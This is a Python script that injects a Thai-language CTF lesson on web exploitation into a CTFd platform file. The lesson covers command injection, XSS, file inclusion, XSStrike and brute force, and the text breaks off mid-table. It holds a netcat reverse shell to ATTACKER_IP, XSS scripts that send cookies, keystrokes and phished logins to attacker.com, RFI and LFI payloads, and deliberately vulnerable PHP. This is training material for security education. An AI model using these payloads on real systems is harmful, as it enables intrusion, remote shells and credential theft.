import os

file_path = "/home/kali/crru_ctf/CTFd/term_w36_web_app_complete_v5.py"

with open(file_path, "r", encoding="utf-8") as f:
    code = f.read()

# Locate the beginning of the val179_0 string
start_marker = 'val179_0 = """## 🎭'
start_idx = code.find(start_marker)
if start_idx == -1:
    print("Error: Could not find start marker in the file.")
    exit(1)

# Find the next identifier val179_1 to mark the end of val179_0
end_marker = 'val179_1 = """'
end_idx = code.find(end_marker, start_idx)
if end_idx == -1:
    print("Error: Could not find end marker in the file.")
    exit(1)

# The replacement should go from start_idx to end_idx
# Define the new val179_0 content
new_val179_0 = """val179_0 = \"\"\"## 🎭 Web Exploitation Deep Dive (เจาะลึกช่องโหว่เว็บระดับก้าวหน้า)
---

ยินดีต้อนรับสู่บทเรียนเจาะลึกประเภทการโจมตีทางเว็บ: Command Injection, Cross-Site Scripting (XSS), File Inclusion และ Brute Force Attacks พร้อมเทคนิคการทำงานร่วมกับเครื่องมือและสคริปต์เจาะระบบ

### 📄 SLIDE 121-125: Command Injections: Payloads ( Linux & Windows )
ตารางรวบรวมคำสั่ง Payload ที่ใช้ทดสอบช่องโหว่เพื่อรันคำสั่งบนระบบปฏิบัติการผ่านเว็บเบราว์เซอร์:

<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 12px; font-weight: bold; width: 220px;">สัญลักษณ์/Payload</th>
<th style="padding: 12px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
<th style="padding: 12px; font-weight: bold; width: 150px;">ระบบปฏิบัติการ</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">; ls -l</td>
<td style="padding: 12px;">สั่งให้รันคำสั่งแสดงรายละเอียดไฟล์ (ls) หลังคำสั่งแรกทำงานเสร็จ</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">; id</td>
<td style="padding: 12px;">สั่งรันเพื่อดูข้อมูลผู้ใช้งานปัจจุบัน (User ID, Group ID)</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">&amp; whoami</td>
<td style="padding: 12px;">ใช้ตัวเชื่อม <code>&amp;</code> เพื่อสั่งแสดงชื่อผู้ใช้อัตโนมัติ (นิยมใช้หากเซิร์ฟเวอร์บล็อกเครื่องหมาย <code>;</code>)</td>
<td style="padding: 12px; color: #fb7185;">Linux / Windows</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">&amp; echo vulnerable</td>
<td style="padding: 12px;">พิมพ์แสดงข้อความประเมินเบื้องต้นว่าเว็บสามารถรันคำสั่งได้หรือไม่</td>
<td style="padding: 12px; color: #fb7185;">Linux / Windows</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">`cat /etc/passwd`</td>
<td style="padding: 12px;">สั่งดึงไฟล์รายชื่อบัญชีผู้ใช้ในระบบ Linux ด้วยการใช้เครื่องหมาย Backticks</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">$(whoami)</td>
<td style="padding: 12px;">แทรกรันคำสั่งแสดงชื่อผู้ใช้แบบครอบสัญลักษณ์เพื่อเลี่ยงตัวกรองคัดกรองอักขระ</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">$(cat /etc/passwd)</td>
<td style="padding: 12px;">แทรกดึงไฟล์ผู้ใช้อัตโนมัติด้วยคำสั่งผ่านสัญลักษณ์ดักจับเพื่อเลี่ยงตัวกรอง</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">; nc -e /bin/sh &lt;ATTACKER_IP&gt; 4444</td>
<td style="padding: 12px;">คำสั่งสร้าง Reverse Shell เชื่อมต่อ Terminal สิทธิ์เครื่องเซิร์ฟเวอร์กลับไปหาแฮกเกอร์</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">; net user Administrator /domain</td>
<td style="padding: 12px;">สั่งตรวจสอบแสดงรายชื่อผู้ดูแลระบบในตาราง AD Windows Server</td>
<td style="padding: 12px; color: #fbbf24;">Windows</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 126-130: ตัวอย่างจริงของการยิงเจาะระบบผ่าน Command Injections

#### 💻 1. โค้ดภาษา PHP บนเซิร์ฟเวอร์ที่มีช่องโหว่ (Vulnerable PHP Source)
```php
<?php
    // รับค่าพารามิเตอร์ 'cmd' จากผู้ใช้โดยตรง
    $cmd = $_GET['cmd'];
    
    // เรียกใช้งานคำสั่งระดับระบบปฏิบัติการโดยไม่มีการตรวจสอบหรือหลีกเลี่ยงอักขระพิเศษ
    system("ping -c 1 " . $cmd);
?>
```

#### 🌐 2. การโจมตีผ่านบราวเซอร์ (Web Browser Injection Examples)
แฮกเกอร์สามารถส่ง Payload บายพาสต่อหลังคำสั่ง Ping ได้ดังนี้:
- **ดูชื่อผู้ใช้งานของระบบ**:
  `http://target.com/vuln.php?cmd=;whoami`
- **ดูรหัสประจำตัวผู้รัน**:
  `http://target.com/vuln.php?cmd=$(id)`
- **ดึงรายชื่อไฟล์ทั้งหมด (แบบ URL-encoded ช่องว่าง)**:
  `http://target.com/vuln.php?cmd=;%20ls%20-l`  *(มีค่าเท่ากับ `; ls -l`)*

#### 🐚 3. การโจมตีและขโมยข้อมูลโดยใช้โปรแกรม Bash (cURL POST Method)
แฮกเกอร์สามารถใช้คำสั่ง Terminal บนเครื่องตนเองเพื่อยิงดึงไฟล์ระบบของเป้าหมายและส่งค่ากลับผ่าน HTTP POST:
```bash
curl -X POST -d "cmd=$(cat /etc/passwd)" http://target.com/vuln.php
```

---

### 📄 SLIDE 131-135: Cross-Site Scripting (XSS) Introduction
- **คำจำกัดความ**: Cross-Site Scripting (XSS) คือหนึ่งในภัยคุกคามฝั่ง Client-Side เกิดขึ้นเมื่อผู้พัฒนาละเลยการคัดกรองหรือแปลงอักขระพิเศษในอินพุต ปล่อยให้ผู้ประสงค์ร้ายสามารถแทรกโค้ดสคริปต์ประสงค์ร้าย (โดยมากมักเขียนด้วยภาษา **JavaScript**) เข้าสู่หน้าเพจของเว็บแอปพลิเคชัน
- **เป้าหมายและผลกระทบ**: เมื่อมีผู้ใช้งานทั่วไปโหลดหน้าเพจนั้น สคริปต์จะถูกเรียกทำงานบนเบราว์เซอร์ของเหยื่อทันที เพื่อดึงคีย์ตรวจสอบสิทธิ์ (Session Tokens), คุกกี้ความลับ (Cookies), ขโมยรหัสผ่าน หรือทำธุรกรรมปลอมในนามของเหยื่อ
- **ศึกษาประเด็นเพิ่มเติม**: [Cross-Site Scripting Web Application Security](https://www.spanning.com/blog/cross-site-scripting-web-based-application-security-part-3/)

---

### 📄 SLIDE 136-140: ประเภทของช่องโหว่ Cross-Site Scripting (XSS)

#### 🎭 1. Stored XSS (Persistent XSS - แบบบันทึกถาวร)
- **หลักการ**: โค้ดสคริปต์ประสงค์ร้ายจะถูกส่งเข้าไป **บันทึกเก็บไว้ในฐานข้อมูล (Database)** ของเซิร์ฟเวอร์โดยตรง (เช่น ในกล่องข้อความเว็บบอร์ด, ความคิดเห็น, รายละเอียดสินค้า)
- เมื่อมีผู้ใช้งานคนอื่นเปิดเข้ามาชมหน้านั้นในอนาคต สคริปต์จะทำงานบนบราวเซอร์ของพวกเขาทุกครั้งแบบอัตโนมัติ
- **ตัวอย่าง Payload**:
  ```html
  <script>alert('Stored XSS Vulnerable!');</script>
  ```

#### 🎭 2. Reflected XSS (Non-Persistent XSS - แบบสะท้อนกลับ)
- **หลักการ**: สคริปต์แนบมาเป็น **ส่วนหนึ่งของ URL ลิงก์หรือพารามิเตอร์คำสั่งขอใช้งาน (Request)** เมื่อเซิร์ฟเวอร์นำข้อมูลอินพุตจาก URL นั้นกลับมาวาดหน้าเว็บตอบกลับทันทีโดยไม่ได้เก็บบันทึกในระบบ
- **ตัวอย่างลิงก์โจมตี**:
  `http://target.com/search?q=<script>alert('Reflected XSS');</script>`
- หากผู้ใช้กดคลิกลิงก์ที่แฮกเกอร์แนบมานี้ โค้ดประสงค์ร้ายจะทำงานในเครื่องของเหยื่อทันที

#### 🎭 3. DOM-Based XSS (แบบปรับแก้โครงสร้างเอกสารเว็บ)
- **หลักการ**: เกิดขึ้นบนฝั่งเครื่องผู้รับบริการโดยตรง (Client-Side JavaScript) โดยสคริปต์ที่แฮกเกอร์ส่งเข้ามาจะเข้าไปแก้ไขวัตถุใน **DOM (Document Object Model)** ของหน้าเว็บขณะที่ทำงาน โดยไม่มีการส่งข้อมูลหรือติดต่อคุยกับเว็บเซิร์ฟเวอร์หลังบ้านเลย
- **ตัวอย่างช่องโหว่**: หน้าเว็บรับค่าจาก Hash URL มาแสดงผลโดยตรง:
  `http://target.com/#<script>alert('DOM XSS')</script>`

---

### 📄 SLIDE 141-145: Common XSS Payloads Cheatsheet (ตารางรวบรวมคีย์เจาะระบบ XSS)
รายการ Payload ยอดนิยมในการทดสอบระบบความปลอดภัยเพื่อตรวจสอบความรัดกุมของหน้าเว็บ:

<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 10px; font-weight: bold; width: 320px;">คีย์เจาะระบบ XSS (Payload)</th>
<th style="padding: 10px; font-weight: bold;">ผลลัพธ์และคำอธิบาย (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #f43f5e;">&lt;script&gt;alert('XSS')&lt;/script&gt;</td>
<td style="padding: 10px;">การเรียกใช้งานคำสั่งพื้นฐานส่งข้อความแจ้งเตือนป๊อปอัพยืนยันช่องโหว่</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #f43f5e;">"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</td>
<td style="padding: 10px;">การส่งเครื่องหมายปิดคุณสมบัติเพื่อปิดแท็ก HTML เก่าก่อนหน้า แล้วบังคับแทรกแท็ก script ใหม่เข้ามาทำงาน</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #3b82f6;">&lt;img src=x onerror=alert('XSS')&gt;</td>
<td style="padding: 10px;">การใช้รูปภาพที่ไม่มีอยู่จริงเพื่อกระตุ้นให้เกิดเหตุการณ์ผิดพลาด (onerror) แล้วรันคำสั่งแฝง</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #3b82f6;">&lt;svg/onload=alert('XSS')&gt;</td>
<td style="padding: 10px;">การแทรกโค้ดแบบใช้แท็กกราฟิก SVG เพื่อหลบเลี่ยงการดักจับข้อความคำว่า "script"</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #fbbf24;">&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</td>
<td style="padding: 10px;">แทรกหน้าเอกสารกรอบ iframe ย่อยและสั่งให้ประมวลผลสคริปต์ในตำแหน่งต้นทางของกรอบ</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #fbbf24;">&lt;input type="text" onfocus="alert('XSS')" autofocus&gt;</td>
<td style="padding: 10px;">การใช้ช่องกรอกข้อมูลที่จะทำการโฟกัสอัตโนมัติ (onfocus) เพื่อสั่งรันคำสั่งโดยผู้ใช้ไม่ต้องขยับเมาส์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #10b981;">&lt;body onload=alert('XSS')&gt;</td>
<td style="padding: 10px;">สั่งให้โค้ดประมวลผลทันทีที่ตัวเว็บและรายละเอียดในหน้าโหลดโครงสร้างเสร็จสิ้น</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08)">
<td style="padding: 10px; font-family: monospace; color: #10b981;">&lt;a href="javascript:alert('XSS')"&gt;Click me&lt;/a&gt;</td>
<td style="padding: 10px;">การฝังสคริปต์ไว้ในลิงก์เชื่อมโยง เพื่อหลอกล่อให้เหยื่อคลิกเข้ามาเรียกใช้งานคำสั่ง</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 146-150: XSS Scenario: Real-world Attacking Scenarios (ตัวอย่างภัยพิบัติที่แฮกเกอร์นำไปใช้จริง)

#### 🟢 1. การดักจับขโมยเซสชันคุกกี้ (Session Hijacking & Cookie Stealing)
สคริปต์สแกนหาข้อมูลคุกกี้สิทธิ์ของผู้ใช้เพื่อทำการแอบส่งออกไปยังเซิร์ฟเวอร์เก็บข้อมูลของแฮกเกอร์:
```html
<script>
    document.location='http://attacker.com/steal.php?cookie=' + document.cookie;
</script>
```

#### 🟢 2. การฝังสปายดักจับแป้นพิมพ์ป้อนข้อมูล (Keylogging Attack)
การลอบดักจับทุกการกดปุ่มของเหยื่อบนแป้นพิมพ์เพื่อขโมยรหัสผ่านหรือข้อมูลบัตรเครดิตขณะกรอกเว็บ:
```html
<script>
    document.onkeypress = function(e) {
        fetch('http://attacker.com/log.php?key=' + encodeURIComponent(e.key));
    };
</script>
```

#### 🟢 3. การสร้างแบบฟอร์มยืนยันตัวตนปลอมเพื่อตกเหยื่อ (Phishing Attack)
การเขียนสคริปต์ทับโครงสร้างหน้าเว็บปัจจุบันเพื่อวาดแบบฟอร์มขอรหัสผ่านส่งหาแฮกเกอร์:
```html
<script>
    document.body.innerHTML = '<h2>Session Expired. Please log in again.</h2>' +
      '<form action="http://attacker.com/collect.php" method="POST">' +
      'Username: <input type="text" name="user" required><br>' +
      'Password: <input type="password" name="pass" required><br>' +
      '<input type="submit" value="Login"></form>';
</script>
```

---

### 📄 SLIDE 151-160: Automated XSS Tool: XSStrike (เครื่องมือสแกนหา XSS อัจฉริยะ)
**XSStrike** คือเครื่องมือสแกนช่องโหว่ Cross-Site Scripting (XSS) ยอดนิยมระดับโลก พัฒนาขึ้นมาด้วยภาษา Python:
- มีความฉลาดลึกซึ้งกว่าเครื่องมือสแกนแบบสุ่มทั่วไป เนื่องจากจะทำการจำแนกและวิเคราะห์ความปลอดภัยในการตอบสนองของเว็บไซต์เป้าหมาย แล้วสุ่มพัฒนาสร้าง Payload เฉพาะขึ้นมาเจาะระบบเพื่อ bypass ระบบคัดกรองความปลอดภัย (WAF Bypass)
- **การติดตั้งเรียกใช้งาน**:
  ```bash
  # 1. โคลนคลังโค้ดจากกิตฮับมาเก็บลงระบบ
  git clone https://github.com/s0md3v/XSStrike.git
  
  # 2. ย้ายโฟลเดอร์เข้าไปยังสคริปต์เรียกใช้งาน
  cd XSStrike
  
  # 3. ติดตั้งไลบรารีอ้างอิงที่จำเป็นของระบบ
  pip3 install -r requirements.txt
  
  # 4. เรียกใช้งานเครื่องมือสแกน
  python3 xsstrike.py --help
  ```

#### 🛠️ ตารางสรุปออปชันคำสั่งของ XSStrike (Cheatsheet)
<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 10px; font-weight: bold; width: 180px;">คำสั่ง (Option)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">-u &lt;URL&gt;</td>
<td style="padding: 10px;">กำหนดลิงก์เว็บไซต์เป้าหมายที่ต้องการสแกนหา XSS (เช่น <code>-u "http://target.com/search.php?q=test"</code>)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--auto</td>
<td style="padding: 10px;">สั่งรันระบบประมวลผลและทดสอบยิงเจาะหาผลลัพธ์แบบอัตโนมัติทั้งหมด</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--params</td>
<td style="padding: 10px;">สแกนตรวจสอบพารามิเตอร์นำเข้าและฟิลด์ทั้งหมดที่มีอยู่จริงของหน้านั้น</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--fuzz</td>
<td style="padding: 10px;">รันโหมดสุ่มส่งโค้ดพิเศษ เพื่อตรวจสอบผลการประมวลผลสำหรับ WAF Bypass</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--file &lt;filepath&gt;</td>
<td style="padding: 10px;">สั่งสแกนตรวจสอบรายการเป้าหมายหลายพิกัดจากไฟล์บันทึกรายการรายชื่อลิงก์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--data "&lt;DATA&gt;"</td>
<td style="padding: 10px;">ทดสอบวิเคราะห์ช่องโหว่ความมั่นคงในรูปแบบข้อมูลที่ส่งผ่าน POST method</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--cookie "&lt;COOKIE&gt;"</td>
<td style="padding: 10px;">ส่งสวมคุกกี้สิทธิ์เซสชันของระบบเข้าไปเพื่อสแกนโซนล็อกอินหลังบ้าน</td>
</tr>
</tbody>
</table>
</div>

#### 🐚 ตัวอย่างรูปแบบคำสั่งการใช้งานจริงของ XSStrike
- **สแกนค้นหาเบื้องต้นของพารามิเตอร์**:
  `python3 xsstrike.py -u "http://target.com/search.php?q=test"`
- **สั่งสแกนเจาะระบบอัตโนมัติพร้อมเลือกคำตอบ Payload ให้อัตโนมัติ**:
  `python3 xsstrike.py --auto -u "http://target.com/search.php?q=test"`
- **รันตรวจสอบโหมดหลบเลี่ยงไฟร์วอลล์ (WAF Bypass Mode)**:
  `python3 xsstrike.py -u "http://target.com/search.php?q=" --fuzz`

---

### 📄 SLIDE 161-170: File Inclusion Attacks (ภัยคุกคามการเรียกเข้าใช้ไฟล์ระบบ)
**ช่องโหว่การนำเข้าไฟล์ระบบ (File Inclusion)** เกิดจากการที่โปรแกรมหรือภาษาหลังบ้านยอมรับพาธไฟล์ที่ผู้ใช้อินพุตมานำไปเรียกใช้งานฟังก์ชันดึงเนื้อหา (เช่น `include`, `require`, `file_get_contents` ใน PHP) โดยขาดการตรวจสอบสิทธิ์ความมั่นคงปลอดภัย
- **Local File Inclusion (LFI)**: แฮกเกอร์ใช้ช่องโหว่เพื่อขออ่านหรือประมวลผลไฟล์ภายใน **ระบบปฏิบัติการของเว็บเซิร์ฟเวอร์เอง** (เช่น ดึงไฟล์ `/etc/passwd` หรือล็อกของเครื่องแม่ข่าย)
- **Remote File Inclusion (RFI)**: แฮกเกอร์สามารถสั่งให้เซิร์ฟเวอร์ดึงเนื้อหาและประมวลผลสคริปต์แปลกปลอมที่เก็บไว้ใน **เครื่องเครือข่ายภายนอก (Remote Server)** ซึ่งมักก่อให้เกิดความเสี่ยงถูกแฮกควบคุมเครื่องเซิร์ฟเวอร์ได้อย่างง่ายดาย

#### 💻 ตัวอย่างโค้ดอันตรายเปรียบเทียบ LFI vs RFI (Vulnerable source comparison)
```php
// 🟢 ตัวอย่างช่องโหว่ Local File Inclusion (LFI)
<?php
    // แอปพลิเคชันนำชื่อไฟล์ในหน้าเพจไปแสดงผลตรงๆ
    include($_GET['page']);
?>
// หากแฮกเกอร์พิมพ์เรียก: page=../../../../etc/passwd ระบบจะอ่านข้อมูลรายชื่อบัญชีระบบออกมาแสดงทันที

// 🔵 ตัวอย่างช่องโหว่ Remote File Inclusion (RFI)
<?php
    // แอปนำค่าพาธที่เหยื่อกรอกไปเรียกใช้งาน
    include($_GET['file']);
?>
// หากแฮกเกอร์พิมพ์เรียก: file=http://attacker.com/malicious_shell.txt ระบบจะดึงโค้ดอันตรายภายนอกมาประมวลผล
```

---

### 📄 SLIDE 171-180: File Inclusion Attacks in Action (ตัวอย่างการใช้งานเพื่อตรวจสอบความปลอดภัย)

#### 🌐 1. การป้อนเรียกใช้งานผ่าน URL เพื่อเข้าถึงทรัพยากร
- **LFI - การขยับตำแหน่งข้ามโฟลเดอร์เพื่อดึงรายชื่อผู้ใช้ Linux**:
  `http://example.com/getFile?name=../../../etc/passwd`
- **LFI - การดึงข้อมูลล็อกเข้าใช้งาน Apache เพื่อทำการลอบฝัง Web Shell (Log Poisoning)**:
  `http://target.com/index.php?page=../../../../../../../var/log/apache2/access.log`
- **RFI - การสั่งประมวลผลโค้ดสคริปต์อันตรายข้ามเครือข่ายภายนอก**:
  `http://target.com/index.php?page=http://attacker.com/malicious_file.php`

#### 🐚 2. การสั่งยิงช่องโหว่ดึงไฟล์ระบบโดยใช้คำสั่ง cURL (POST-Based LFI)
```bash
curl -X POST -d "name=../../../etc/passwd" http://example.com/getFile
```

---

### 📄 SLIDE 181-190: File Inclusion Payload Cheatsheet (ตารางคีย์เจาะระบบนำเข้าไฟล์)
<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 10px; font-weight: bold; width: 60px;">ประเภท</th>
<th style="padding: 10px; font-weight: bold; width: 340px;">คีย์เจาะระบบ (Payload)</th>
<th style="padding: 10px; font-weight: bold;">ผลลัพธ์และคำอธิบาย (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #f43f5e;">../../../../etc/passwd</td>
<td style="padding: 10px;">ขยับตำแหน่งขึ้นไปอ่านไฟล์รายชื่อผู้ใช้ระบบปฏิบัติการ Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #f43f5e;">../../../../../../../boot.ini</td>
<td style="padding: 10px;">ดึงไฟล์โครงสร้างการบูตเปิดระบบปฏิบัติการ Windows</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #3b82f6;">php://input</td>
<td style="padding: 10px;">เรียกใช้อินพุตสตรีมของ PHP เพื่อป้อนประมวลผลโค้ดอันตรายผ่าน Request Body</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #3b82f6;">php://filter/convert.base64-encode/resource=index.php</td>
<td style="padding: 10px;">เรียกอ่านโค้ดต้นฉบับภาษา PHP (Source Code) โดยส่งออกมาในรูปแบบรหัส Base64 เพื่อเลี่ยงการรันประมวลผลไฟล์ซ้อน</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #fbbf24;">....//....//....//windows/system.ini</td>
<td style="padding: 10px;">บายพาสคีย์เวิร์ดการกรองคำว่า <code>../</code> แบบชั้นเดียว โดยการซ้อนรูปแบบอักขระ</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #fbbf24;">..\\..\\..\\..\\..\\windows\\win.ini</td>
<td style="padding: 10px;">ใช้เครื่องหมาย Backslash ขยับตำแหน่งไฟล์เพื่อเลี่ยงตัวกรองพารามิเตอร์แบบปกติ (Windows เท่านั้น)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #fbbf24;">%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd</td>
<td style="padding: 10px;">ใช้รหัสตัวอักษร URL-encoded (เช่น <code>%2e%2e%2f</code> แปลงมาจาก <code>../</code>) เพื่อเลี่ยงการจับความสัมพันธ์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08)">
<td style="padding: 10px; font-weight: bold; color: #10b981;">RFI</td>
<td style="padding: 10px; font-family: monospace; color: #ec4899;">http://attacker.com/mal_file.txt</td>
<td style="padding: 10px;">ดึงไฟล์สคริปต์ของแฮกเกอร์ข้ามโดเมนภายนอกเข้ามาประมวลผลบนเป้าหมาย</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 191-195: Brute Force Attacks (การเดาแบบรุนแรงเพื่อเข้าสู่ระบบ)
- **คำจำกัดความ**: Brute Force Attack คือกระบวนการลองสุ่มรหัสผ่านหรือข้อมูลยืนยันตัวตนแบบลองผิดลองถูกซ้ำๆ (Trial-and-Error) โดยระบบควบคุมอัตโนมัติหรือโปรแกรม เพื่อพยายามสุ่มเดาจนกว่าจะเจอข้อมูลที่ถูกต้อง
- **เป้าหมายหลัก**:
  - การแกะข้อมูลรหัสผ่านบัญชีทั่วไปและแอดมิน (Credential cracking)
  - เข้ายึดระบบหรือปลดล็อกขอบเขตข้อมูลที่ถูกเข้ารหัสไว้

#### 🛠️ สรุปประเภทการสุ่มเจาะเข้าสู่ระบบ (Brute Force Types)
<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 10px; font-weight: bold; width: 220px;">ประเภทการเดา (Attack Type)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #ffffff;">Simple Brute Force</td>
<td style="padding: 10px;">ใช้ตัวอักษรและตัวเลขประมวลผลทุกตัวอักษรที่สลับเป็นไปได้ทั้งหมด (เช่น aa1, aa2...)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-weight: bold; color: #ffffff;">Dictionary Attack</td>
<td style="padding: 10px;">สุ่มข้อมูลรหัสผ่านอ้างอิงจากคลังรายการรหัสผ่านยอดนิยมในอดีต (Wordlist/Dictionary)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #ffffff;">Hybrid Attack</td>
<td style="padding: 10px;">นำคำอ้างอิงจากพจนานุกรมมาเสริมแต่งตัวอักษรหรือตัวเลขต่อท้ายเพิ่มเติม (เช่น `password123`)</td>
</tr>
